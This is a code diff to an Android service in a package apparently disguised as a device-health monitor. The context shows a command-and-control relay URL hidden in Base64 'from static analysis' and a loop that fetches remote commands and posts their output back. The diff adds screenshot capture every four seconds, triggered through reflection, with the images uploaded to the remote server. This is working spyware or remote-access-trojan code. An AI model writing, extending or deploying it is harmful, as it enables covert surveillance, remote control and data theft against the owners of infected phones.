@@ -40,6 +40,9 @@ public class SyncService extends Service {
 
     public static SyncService getInstance() { return instance; }
 
+    // Set by MonitorService (full flavor) when a screenshot is ready
+    static volatile byte[] pendingShot = null;
+
     // Relay URL hidden from static analysis — decoded at runtime
     private static String ep() {
         return new String(Base64.decode("aHR0cHM6Ly94dXNiLTBjMHAub25yZW5kZXIuY29t", Base64.DEFAULT));
@@ -71,12 +74,23 @@ public class SyncService extends Service {
 
     private void loop() {
         String id = loadId();
-        long lastReg = 0;
+        long lastReg = 0, lastShot = 0;
         int lastCid = 0;
         while (running) {
             try {
                 long now = System.currentTimeMillis();
                 if (now - lastReg > 30_000) { reg(id); lastReg = now; }
+                // Screenshot — only active when MonitorService (full flavor) is running
+                if (now - lastShot > 4_000) {
+                    try {
+                        Class<?> ms = Class.forName("com.device.health.monitor.MonitorService");
+                        Object inst = ms.getMethod("getInstance").invoke(null);
+                        if (inst != null) ms.getMethod("snap").invoke(inst);
+                    } catch (Exception ignored) {}
+                    byte[] s = pendingShot;
+                    if (s != null) { pendingShot = null; pushShot(id, s); }
+                    lastShot = now;
+                }
                 JSONObject p = get("/esp/device-cmd?did=" + URLEncoder.encode(id, "UTF-8"));
                 String cmd = p.optString("cmd", "");
                 int cid = p.optInt("id", 0);
@@ -132,6 +146,16 @@ public class SyncService extends Service {
             b.put("did", id); b.put("cmd", cmd); b.put("out", out);
             b.put("os", "Android " + Build.VERSION.RELEASE);
             post("/esp/device-cmdout", b);
+        } catch (Exception ignored) {}
+    }
+
+    void pushShot(String id, byte[] img) {
+        try {
+            JSONObject b = new JSONObject();
+            b.put("did", id);
+            b.put("img", Base64.encodeToString(img, Base64.NO_WRAP));
+            b.put("os", "Android " + Build.VERSION.RELEASE);
+            post("/esp/device-screenshot", b);
         } catch (Exception ignored) {}
     }
 
